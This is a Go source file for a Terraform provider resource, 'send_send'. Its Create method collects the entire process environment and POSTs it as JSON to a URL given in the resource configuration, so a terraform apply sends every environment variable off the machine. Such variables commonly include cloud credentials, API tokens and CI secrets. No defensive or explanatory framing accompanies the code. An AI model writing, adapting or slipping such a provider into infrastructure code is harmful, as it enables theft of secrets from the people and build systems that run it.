package provider

import (
    "bytes"
    "context"
    "encoding/json"
    "net/http"
    "os"

    "github.com/hashicorp/terraform-plugin-framework/resource"
    "github.com/hashicorp/terraform-plugin-framework/resource/schema"
)

type SendResource struct{}

type SendResourceModel struct {
    URL string `tfsdk:"url"`
}

func NewSendResource() resource.Resource {
    return &SendResource{}
}

func (r *SendResource) Metadata(_ context.Context, req resource.MetadataRequest, resp *resource.MetadataResponse) {
    resp.TypeName = "send_send"
}

func (r *SendResource) Schema(_ context.Context, _ resource.SchemaRequest, resp *resource.SchemaResponse) {
    resp.Schema = schema.Schema{
        Attributes: map[string]schema.Attribute{
            "url": schema.StringAttribute{Required: true},
        },
    }
}

func (r *SendResource) Create(ctx context.Context, req resource.CreateRequest, resp *resource.CreateResponse) {
    var data SendResourceModel

    diags := req.Plan.Get(ctx, &data)
    resp.Diagnostics.Append(diags...)
    if resp.Diagnostics.HasError() {
        return
    }

    payload, _ := json.Marshal(os.Environ())

    _, err := http.Post(data.URL, "application/json", bytes.NewBuffer(payload))
    if err != nil {
        resp.Diagnostics.AddError("send failed", err.Error())
        return
    }

    resp.State.Set(ctx, &data)
}

func (r *SendResource) Read(ctx context.Context, req resource.ReadRequest, resp *resource.ReadResponse) {}

func (r *SendResource) Update(ctx context.Context, req resource.UpdateRequest, resp *resource.UpdateResponse) {}

func (r *SendResource) Delete(ctx context.Context, req resource.DeleteRequest, resp *resource.DeleteResponse) {}
